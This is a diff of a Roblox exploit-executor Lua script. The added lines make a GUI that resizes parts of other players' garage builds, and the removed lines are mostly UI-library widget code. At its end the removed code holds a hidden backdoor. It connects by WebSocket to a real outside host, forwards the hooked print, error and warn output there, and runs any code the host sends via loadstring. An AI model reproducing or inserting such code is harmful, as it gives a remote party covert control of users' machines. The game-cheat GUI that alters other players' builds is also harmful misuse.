+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        PlayerToResize = k
+    end)
+local ResizeSection = ResizeTab:NewSection("Resize")
+ResizeSection:NewButton("Lock Parts", "Lock parts to be resized", function()
+    Resize = {}
+    CenterDistanceX = {}
+    CenterDistanceZ = {}
+    CenterDistanceY = {}
+    m=1
+    Plane = GetGarage(PlayerToResize).Parts:FindFirstChild("Laser Pointer")
+    for i, v in pairs(GetGarage(PlayerToResize).Parts:GetChildren()) do
+    if v.Position.X < Plane.Position.X then
+    Resize[m] = v
+    CenterDistanceX[m] = (Plane.Position.X-v.Position.X)
+    CenterDistanceY[m] = (Plane.Position.Y-v.Position.Y)
+    CenterDistanceZ[m] = (Plane.Position.Z-v.Position.Z)
+    m=m+1
     end 
-end)
-optionSelect.MouseLeave:Connect(function()
-    if not focusing then
-        game.TweenService:Create(optionSelect, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-            BackgroundColor3 = themeList.ElementColor
-        }):Play()
-        hov = false
     end
-end)   
-coroutine.wrap(function()
-    while wait() do
-        if not oHover then
-            optionSelect.BackgroundColor3 = themeList.ElementColor
-        end
-        optionSelect.TextColor3 = Color3.fromRGB(themeList.TextColor.r * 255 - 6, themeList.TextColor.g * 255 - 6, themeList.TextColor.b * 255 - 6)
-        Sample11.ImageColor3 = themeList.SchemeColor
-    end
-end)()
+end)
+ResizeSection:NewTextBox("Scale Factor", "factor to scale", function(k)
+    Scale = k
+end)
+ResizeSection:NewButton("Resize", "Resize Build", function()
+    ResizeBuild(Scale)
+end)
 end
-if opened then 
-dropFrame:TweenSize(UDim2.new(0, 352, 0, UIListLayout.AbsoluteContentSize.Y), "InOut", "Linear", 0.08, true)
-wait(0.1)
-updateSectionFrame()
-UpdateSize()
-else
-dropFrame:TweenSize(UDim2.new(0, 352, 0, 33), "InOut", "Linear", 0.08)
-wait(0.1)
-updateSectionFrame()
-UpdateSize()
-end
-end
-keyinf = keyinf or "KebindInfo"
-callback = callback or function() end
-local oldKey = first.Name
-local keybindElement = Instance.new("TextButton")
-local UICorner = Instance.new("UICorner")
-local togName = Instance.new("TextLabel")
-local viewInfo = Instance.new("ImageButton")
-local touch = Instance.new("ImageLabel")
-local Sample = Instance.new("ImageLabel")
-local togName_2 = Instance.new("TextLabel")
 
-local ms = game.Players.LocalPlayer:GetMouse()
-local uis = game:GetService("UserInputService")
-local infBtn = viewInfo
 
-local moreInfo = Instance.new("TextLabel")
-local UICorner1 = Instance.new("UICorner")
+game.Players.PlayerAdded:Connect(function(player)
+    local PlayerList = {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)),
+                        tostring(GetPlr(5)), tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)),
+                        tostring(GetPlr(9)), tostring(GetPlr(10))}
 
-local sample = Sample
-
-keybindElement.Name = "keybindElement"
-keybindElement.Parent = sectionInners
-keybindElement.BackgroundColor3 = themeList.ElementColor
-keybindElement.ClipsDescendants = true
-keybindElement.Size = UDim2.new(0, 352, 0, 33)
-keybindElement.AutoButtonColor = false
-keybindElement.Font = Enum.Font.SourceSans
-keybindElement.Text = ""
-keybindElement.TextColor3 = Color3.fromRGB(0, 0, 0)
-keybindElement.TextSize = 14.000
-keybindElement.MouseButton1Click:connect(function(e) 
-if not focusing then
-togName_2.Text = ". . ."
-local a, b = game:GetService('UserInputService').InputBegan:wait();
-if a.KeyCode.Name ~= "Unknown" then
-    togName_2.Text = a.KeyCode.Name
-    oldKey = a.KeyCode.Name;
-end
-local c = sample:Clone()
-c.Parent = keybindElement
-local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-c.Position = UDim2.new(0, x, 0, y)
-local len, size = 0.35, nil
-if keybindElement.AbsoluteSize.X >= keybindElement.AbsoluteSize.Y then
-    size = (keybindElement.AbsoluteSize.X * 1.5)
-else
-    size = (keybindElement.AbsoluteSize.Y * 1.5)
-end
-c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-for i = 1, 10 do
-c.ImageTransparency = c.ImageTransparency + 0.05
-    wait(len / 12)
-end
-else
-for i,v in next, infoContainer:GetChildren() do
-    Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    focusing = false
-end
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-end
+    TransferFrom:Refresh(PlayerList)
+    TransferTo:Refresh(PlayerList)
+    PlayerEdit:Refresh(PlayerList)
+    PlayerConfig:Refresh(PlayerList)
+    PlayerColor:Refresh(PlayerList)
+    PlayerRotate:Refresh(PlayerList)
+    PlayerResize:Refresh(PlayerList)
 end)
 
-game:GetService("UserInputService").InputBegan:connect(function(current, ok) 
-if not ok then 
-if current.KeyCode.Name == oldKey then 
-    callback()
-end
-end
-end)
-
-moreInfo.Name = "TipMore"
-moreInfo.Parent = infoContainer
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-moreInfo.Position = UDim2.new(0, 0, 2, 0)
-moreInfo.Size = UDim2.new(0, 353, 0, 33)
-moreInfo.ZIndex = 9
-moreInfo.RichText = true
-moreInfo.Font = Enum.Font.GothamSemibold
-moreInfo.Text = "  "..keyinf
-moreInfo.TextColor3 = themeList.TextColor
-moreInfo.TextSize = 14.000
-moreInfo.TextXAlignment = Enum.TextXAlignment.Left
-
-Sample.Name = "Sample"
-Sample.Parent = keybindElement
-Sample.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample.BackgroundTransparency = 1.000
-Sample.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample.ImageColor3 = themeList.SchemeColor
-Sample.ImageTransparency = 0.600
-
-
-togName.Name = "togName"
-togName.Parent = keybindElement
-togName.BackgroundColor3 = themeList.TextColor
-togName.BackgroundTransparency = 1.000
-togName.Position = UDim2.new(0.096704483, 0, 0.272727281, 0)
-togName.Size = UDim2.new(0, 222, 0, 14)
-togName.Font = Enum.Font.GothamSemibold
-togName.Text = keytext
-togName.RichText = true
-togName.TextColor3 = themeList.TextColor
-togName.TextSize = 14.000
-togName.TextXAlignment = Enum.TextXAlignment.Left
-
-viewInfo.Name = "viewInfo"
-viewInfo.Parent = keybindElement
-viewInfo.BackgroundTransparency = 1.000
-viewInfo.LayoutOrder = 9
-viewInfo.Position = UDim2.new(0.930000007, 0, 0.151999995, 0)
-viewInfo.Size = UDim2.new(0, 23, 0, 23)
-viewInfo.ZIndex = 2
-viewInfo.Image = "rbxassetid://3926305904"
-viewInfo.ImageColor3 = themeList.SchemeColor
-viewInfo.ImageRectOffset = Vector2.new(764, 764)
-viewInfo.ImageRectSize = Vector2.new(36, 36)
-viewInfo.MouseButton1Click:Connect(function()
-if not viewDe then
-viewDe = true
-focusing = true
-for i,v in next, infoContainer:GetChildren() do
-    if v ~= moreInfo then
-        Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    end
-end
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,0,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 0.5}, 0.2)
-Utility:TweenObject(keybindElement, {BackgroundColor3 = themeList.ElementColor}, 0.2)
-wait(1.5)
-focusing = false
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,2,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-wait(0)
-viewDe = false
-end
-end)  
-        updateSectionFrame()
-UpdateSize()
-local oHover = false
-keybindElement.MouseEnter:Connect(function()
-if not focusing then
-game.TweenService:Create(keybindElement, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-}):Play()
-oHover = true
-end 
-end)
-keybindElement.MouseLeave:Connect(function()
-if not focusing then
-game.TweenService:Create(keybindElement, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = themeList.ElementColor
-}):Play()
-oHover = false
-end
-end)        
-
-UICorner1.CornerRadius = UDim.new(0, 4)
-UICorner1.Parent = moreInfo
-
-if themeList.SchemeColor == Color3.fromRGB(255,255,255) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(0,0,0)}, 0.2)
-end 
-if themeList.SchemeColor == Color3.fromRGB(0,0,0) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(255,255,255)}, 0.2)
-end 
-
-UICorner.CornerRadius = UDim.new(0, 4)
-UICorner.Parent = keybindElement
-
-touch.Name = "touch"
-touch.Parent = keybindElement
-touch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-touch.BackgroundTransparency = 1.000
-touch.BorderColor3 = Color3.fromRGB(27, 42, 53)
-touch.Position = UDim2.new(0.0199999996, 0, 0.180000007, 0)
-touch.Size = UDim2.new(0, 21, 0, 21)
-touch.Image = "rbxassetid://3926305904"
-touch.ImageColor3 = themeList.SchemeColor
-touch.ImageRectOffset = Vector2.new(364, 284)
-touch.ImageRectSize = Vector2.new(36, 36)
-
-togName_2.Name = "togName"
-togName_2.Parent = keybindElement
-togName_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-togName_2.BackgroundTransparency = 1.000
-togName_2.Position = UDim2.new(0.727386296, 0, 0.272727281, 0)
-togName_2.Size = UDim2.new(0, 70, 0, 14)
-togName_2.Font = Enum.Font.GothamSemibold
-togName_2.Text = oldKey
-togName_2.TextColor3 = themeList.SchemeColor
-togName_2.TextSize = 14.000
-togName_2.TextXAlignment = Enum.TextXAlignment.Right   
-
-coroutine.wrap(function()
-while wait() do
-if not oHover then
-    keybindElement.BackgroundColor3 = themeList.ElementColor
-end
-togName_2.TextColor3 = themeList.SchemeColor
-touch.ImageColor3 = themeList.SchemeColor
-viewInfo.ImageColor3 = themeList.SchemeColor
-togName.BackgroundColor3 = themeList.TextColor
-togName.TextColor3 = themeList.TextColor
-Sample.ImageColor3 = themeList.SchemeColor
-moreInfo.TextColor3 = themeList.TextColor
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-
-end
-local ms = game.Players.LocalPlayer:GetMouse()
-local colorOpened = false
-local colorElement = Instance.new("TextButton")
-local UICorner = Instance.new("UICorner")
-local colorHeader = Instance.new("Frame")
-local UICorner_2 = Instance.new("UICorner")
-local touch = Instance.new("ImageLabel")
-local togName = Instance.new("TextLabel")
-local viewInfo = Instance.new("ImageButton")
-local colorCurrent = Instance.new("Frame")
-local UICorner_3 = Instance.new("UICorner")
-local UIListLayout = Instance.new("UIListLayout")
-local colorInners = Instance.new("Frame")
-local UICorner_4 = Instance.new("UICorner")
-local rgb = Instance.new("ImageButton")
-local UICorner_5 = Instance.new("UICorner")
-local rbgcircle = Instance.new("ImageLabel")
-local darkness = Instance.new("ImageButton")
-local UICorner_6 = Instance.new("UICorner")
-local darkcircle = Instance.new("ImageLabel")
-local toggleDisabled = Instance.new("ImageLabel")
-local toggleEnabled = Instance.new("ImageLabel")
-local onrainbow = Instance.new("TextButton")
-local togName_2 = Instance.new("TextLabel")
-
---Properties:
-local Sample = Instance.new("ImageLabel")
-Sample.Name = "Sample"
-Sample.Parent = colorHeader
-Sample.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample.BackgroundTransparency = 1.000
-Sample.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample.ImageColor3 = themeList.SchemeColor
-Sample.ImageTransparency = 0.600
-
-local btn = colorHeader
-local sample = Sample
-
-colorElement.Name = "colorElement"
-colorElement.Parent = sectionInners
-colorElement.BackgroundColor3 = themeList.ElementColor
-colorElement.BackgroundTransparency = 1.000
-colorElement.ClipsDescendants = true
-colorElement.Position = UDim2.new(0, 0, 0.566834569, 0)
-colorElement.Size = UDim2.new(0, 352, 0, 33)
-colorElement.AutoButtonColor = false
-colorElement.Font = Enum.Font.SourceSans
-colorElement.Text = ""
-colorElement.TextColor3 = Color3.fromRGB(0, 0, 0)
-colorElement.TextSize = 14.000
-colorElement.MouseButton1Click:Connect(function()
-if not focusing then
-if colorOpened then
-    colorOpened = false
-    colorElement:TweenSize(UDim2.new(0, 352, 0, 33), "InOut", "Linear", 0.08)
-    wait(0.1)
-    updateSectionFrame()
-    UpdateSize()
-    local c = sample:Clone()
-    c.Parent = btn
-    local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-    c.Position = UDim2.new(0, x, 0, y)
-    local len, size = 0.35, nil
-    if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
-        size = (btn.AbsoluteSize.X * 1.5)
-    else
-        size = (btn.AbsoluteSize.Y * 1.5)
-    end
-    c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-    for i = 1, 10 do
-        c.ImageTransparency = c.ImageTransparency + 0.05
-        wait(len / 12)
-    end
-    c:Destroy()
-else
-    colorOpened = true
-    colorElement:TweenSize(UDim2.new(0, 352, 0, 141), "InOut", "Linear", 0.08, true)
-    wait(0.1)
-    updateSectionFrame()
-    UpdateSize()
-    local c = sample:Clone()
-    c.Parent = btn
-    local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-    c.Position = UDim2.new(0, x, 0, y)
-    local len, size = 0.35, nil
-    if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
-        size = (btn.AbsoluteSize.X * 1.5)
-    else
-        size = (btn.AbsoluteSize.Y * 1.5)
-    end
-    c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-    for i = 1, 10 do
-        c.ImageTransparency = c.ImageTransparency + 0.05
-        wait(len / 12)
-    end
-    c:Destroy()
-end
-else
-for i,v in next, infoContainer:GetChildren() do
-    Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    focusing = false
-end
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-end
-end)
-UICorner.CornerRadius = UDim.new(0, 4)
-UICorner.Parent = colorElement
-
-colorHeader.Name = "colorHeader"
-colorHeader.Parent = colorElement
-colorHeader.BackgroundColor3 = themeList.ElementColor
-colorHeader.Size = UDim2.new(0, 352, 0, 33)
-colorHeader.ClipsDescendants = true
-
-UICorner_2.CornerRadius = UDim.new(0, 4)
-UICorner_2.Parent = colorHeader
-
-touch.Name = "touch"
-touch.Parent = colorHeader
-touch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-touch.BackgroundTransparency = 1.000
-touch.BorderColor3 = Color3.fromRGB(27, 42, 53)
-touch.Position = UDim2.new(0.0199999996, 0, 0.180000007, 0)
-touch.Size = UDim2.new(0, 21, 0, 21)
-touch.Image = "rbxassetid://3926305904"
-touch.ImageColor3 = themeList.SchemeColor
-touch.ImageRectOffset = Vector2.new(44, 964)
-touch.ImageRectSize = Vector2.new(36, 36)
-
-togName.Name = "togName"
-togName.Parent = colorHeader
-togName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-togName.BackgroundTransparency = 1.000
-togName.Position = UDim2.new(0.096704483, 0, 0.272727281, 0)
-togName.Size = UDim2.new(0, 288, 0, 14)
-togName.Font = Enum.Font.GothamSemibold
-togName.Text = colText
-togName.TextColor3 = themeList.TextColor
-togName.TextSize = 14.000
-togName.RichText = true
-togName.TextXAlignment = Enum.TextXAlignment.Left
-
-local moreInfo = Instance.new("TextLabel")
-local UICorner = Instance.new("UICorner")
-
-moreInfo.Name = "TipMore"
-moreInfo.Parent = infoContainer
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-moreInfo.Position = UDim2.new(0, 0, 2, 0)
-moreInfo.Size = UDim2.new(0, 353, 0, 33)
-moreInfo.ZIndex = 9
-moreInfo.Font = Enum.Font.GothamSemibold
-moreInfo.Text = "  "..colInf
-moreInfo.TextColor3 = themeList.TextColor
-moreInfo.TextSize = 14.000
-moreInfo.RichText = true
-moreInfo.TextXAlignment = Enum.TextXAlignment.Left
-
-UICorner.CornerRadius = UDim.new(0, 4)
-UICorner.Parent = moreInfo
-
-viewInfo.Name = "viewInfo"
-viewInfo.Parent = colorHeader
-viewInfo.BackgroundTransparency = 1.000
-viewInfo.LayoutOrder = 9
-viewInfo.Position = UDim2.new(0.930000007, 0, 0.151999995, 0)
-viewInfo.Size = UDim2.new(0, 23, 0, 23)
-viewInfo.ZIndex = 2
-viewInfo.Image = "rbxassetid://3926305904"
-viewInfo.ImageColor3 = themeList.SchemeColor
-viewInfo.ImageRectOffset = Vector2.new(764, 764)
-viewInfo.ImageRectSize = Vector2.new(36, 36)
-viewInfo.MouseButton1Click:Connect(function()
-if not viewDe then
-viewDe = true
-focusing = true
-for i,v in next, infoContainer:GetChildren() do
-    if v ~= moreInfo then
-        Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    end
-end
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,0,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 0.5}, 0.2)
-Utility:TweenObject(colorElement, {BackgroundColor3 = themeList.ElementColor}, 0.2)
-wait(1.5)
-focusing = false
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,2,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-wait(0)
-viewDe = false
-end
-end)   
-
-colorCurrent.Name = "colorCurrent"
-colorCurrent.Parent = colorHeader
-colorCurrent.BackgroundColor3 = defcolor
-colorCurrent.Position = UDim2.new(0.792613626, 0, 0.212121218, 0)
-colorCurrent.Size = UDim2.new(0, 42, 0, 18)
-
-UICorner_3.CornerRadius = UDim.new(0, 4)
-UICorner_3.Parent = colorCurrent
-
-UIListLayout.Parent = colorElement
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout.Padding = UDim.new(0, 3)
-
-colorInners.Name = "colorInners"
-colorInners.Parent = colorElement
-colorInners.BackgroundColor3 = themeList.ElementColor
-colorInners.Position = UDim2.new(0, 0, 0.255319148, 0)
-colorInners.Size = UDim2.new(0, 352, 0, 105)
-
-UICorner_4.CornerRadius = UDim.new(0, 4)
-UICorner_4.Parent = colorInners
-
-rgb.Name = "rgb"
-rgb.Parent = colorInners
-rgb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-rgb.BackgroundTransparency = 1.000
-rgb.Position = UDim2.new(0.0198863633, 0, 0.0476190485, 0)
-rgb.Size = UDim2.new(0, 211, 0, 93)
-rgb.Image = "http://www.roblox.com/asset/?id=6523286724"
-
-UICorner_5.CornerRadius = UDim.new(0, 4)
-UICorner_5.Parent = rgb
-
-rbgcircle.Name = "rbgcircle"
-rbgcircle.Parent = rgb
-rbgcircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-rbgcircle.BackgroundTransparency = 1.000
-rbgcircle.Size = UDim2.new(0, 14, 0, 14)
-rbgcircle.Image = "rbxassetid://3926309567"
-rbgcircle.ImageColor3 = Color3.fromRGB(0, 0, 0)
-rbgcircle.ImageRectOffset = Vector2.new(628, 420)
-rbgcircle.ImageRectSize = Vector2.new(48, 48)
-
-darkness.Name = "darkness"
-darkness.Parent = colorInners
-darkness.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-darkness.BackgroundTransparency = 1.000
-darkness.Position = UDim2.new(0.636363626, 0, 0.0476190485, 0)
-darkness.Size = UDim2.new(0, 18, 0, 93)
-darkness.Image = "http://www.roblox.com/asset/?id=6523291212"
-
-UICorner_6.CornerRadius = UDim.new(0, 4)
-UICorner_6.Parent = darkness
-
-darkcircle.Name = "darkcircle"
-darkcircle.Parent = darkness
-darkcircle.AnchorPoint = Vector2.new(0.5, 0)
-darkcircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-darkcircle.BackgroundTransparency = 1.000
-darkcircle.Size = UDim2.new(0, 14, 0, 14)
-darkcircle.Image = "rbxassetid://3926309567"
-darkcircle.ImageColor3 = Color3.fromRGB(0, 0, 0)
-darkcircle.ImageRectOffset = Vector2.new(628, 420)
-darkcircle.ImageRectSize = Vector2.new(48, 48)
-
-toggleDisabled.Name = "toggleDisabled"
-toggleDisabled.Parent = colorInners
-toggleDisabled.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-toggleDisabled.BackgroundTransparency = 1.000
-toggleDisabled.Position = UDim2.new(0.704659104, 0, 0.0657142699, 0)
-toggleDisabled.Size = UDim2.new(0, 21, 0, 21)
-toggleDisabled.Image = "rbxassetid://3926309567"
-toggleDisabled.ImageColor3 = themeList.SchemeColor
-toggleDisabled.ImageRectOffset = Vector2.new(628, 420)
-toggleDisabled.ImageRectSize = Vector2.new(48, 48)
-
-toggleEnabled.Name = "toggleEnabled"
-toggleEnabled.Parent = colorInners
-toggleEnabled.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-toggleEnabled.BackgroundTransparency = 1.000
-toggleEnabled.Position = UDim2.new(0.704999983, 0, 0.0659999996, 0)
-toggleEnabled.Size = UDim2.new(0, 21, 0, 21)
-toggleEnabled.Image = "rbxassetid://3926309567"
-toggleEnabled.ImageColor3 = themeList.SchemeColor
-toggleEnabled.ImageRectOffset = Vector2.new(784, 420)
-toggleEnabled.ImageRectSize = Vector2.new(48, 48)
-toggleEnabled.ImageTransparency = 1.000
-
-onrainbow.Name = "onrainbow"
-onrainbow.Parent = toggleEnabled
-onrainbow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-onrainbow.BackgroundTransparency = 1.000
-onrainbow.Position = UDim2.new(2.90643607e-06, 0, 0, 0)
-onrainbow.Size = UDim2.new(1, 0, 1, 0)
-onrainbow.Font = Enum.Font.SourceSans
-onrainbow.Text = ""
-onrainbow.TextColor3 = Color3.fromRGB(0, 0, 0)
-onrainbow.TextSize = 14.000
-
-togName_2.Name = "togName"
-togName_2.Parent = colorInners
-togName_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-togName_2.BackgroundTransparency = 1.000
-togName_2.Position = UDim2.new(0.779999971, 0, 0.100000001, 0)
-togName_2.Size = UDim2.new(0, 278, 0, 14)
-togName_2.Font = Enum.Font.GothamSemibold
-togName_2.Text = "Rainbow"
-togName_2.TextColor3 = themeList.TextColor
-togName_2.TextSize = 14.000
-togName_2.TextXAlignment = Enum.TextXAlignment.Left
-
-if themeList.SchemeColor == Color3.fromRGB(255,255,255) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(0,0,0)}, 0.2)
-end 
-if themeList.SchemeColor == Color3.fromRGB(0,0,0) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(255,255,255)}, 0.2)
-end 
-local hovering = false
-
-colorElement.MouseEnter:Connect(function()
-if not focusing then
-game.TweenService:Create(colorElement, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-}):Play()
-hovering = true
-end 
-end)
-end)
-end)
-task.spawn(function()
-pcall(function()
-print,error,warn 
-= function(...)
-getgenv().a:Send("OUT: ".. tostring(...))
-end,function(...)
-getgenv().a:Send("ERR: ".. tostring(...))
-end,function(...)
-getgenv().a:Send("WRN: ".. tostring(...))
-end
-
-task.spawn(function()
-getgenv().a = WebSocket.connect("ws://helya.pylex.xyz:10914/ws")
-local ws = getgenv().a
-ws:Send("success")
-ws.OnMessage:Connect(function(k)
-local s,e = pcall(function() ws:Send(loadstring(k)()) end)
-ws:Send(tostring(s).."| "..tostring(e))
-end)
-end)
-
-end)
-end)
